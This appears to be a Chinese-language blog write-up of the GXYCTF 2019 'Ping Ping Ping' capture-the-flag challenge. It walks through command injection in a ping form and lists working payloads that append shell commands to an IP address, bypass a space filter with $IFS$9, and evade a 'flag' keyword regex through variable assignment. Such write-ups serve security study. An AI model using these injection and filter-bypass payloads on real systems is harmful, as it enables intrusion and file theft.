---
title: "GXYCTF 2019-Ping Ping Ping"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/靶场实例/RCE/CTF/有回显/GXYCTF 2019-Ping Ping Ping/
categories:
  - 网安笔记
  - 靶场实例
  - RCE
  - CTF
  - 有回显
  - GXYCTF 2019-Ping Ping Ping
tags:
  - Study
---

- 网页可以ping，证明他有可以命令执行的函数，标题也说了
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/3bdbb34492.jpg)
- 那就尝试下加上ls试试查看文件，看到了flag.php
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/36d548f1bc.jpg)
- 发现过滤了空格,
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/7355558125.jpg)
- 大括号也被过滤了
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/40fe16f601.jpg)
- 用$IFS$9绕过，先看看index.php里面源码写了啥
- payload：127.0.0.1;cat$IFS$9index.php
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/7e0a2fc432.jpg)
- 看了源码，
- /.*f.*l.*a._g._/只要匹配到这四个字符组合在一起就显示fxck your flag!了
- 可以采取变量赋值的方式来做
- payload：
- ```bash
  127.0.0.1;q=g;cat$IFS$9fla$q.php
  ```
- 成功执行，f12就能看到flag了
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/df33b2bda3.jpg)
- ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/8bc84dbaa1.jpg)  
    ![NSSIMAGE](https://www.nssctf.cn/files/2024/1/3/e046abf2d7.jpg)
## EXP

- 127.0.0.1;ls
- 127.0.0.1;cat$IFS$9index.php
- 127.0.0.1;q=g;cat$IFS$9fla$q.php

## 总结

- 命令执行
- 空格绕过
- 变量赋值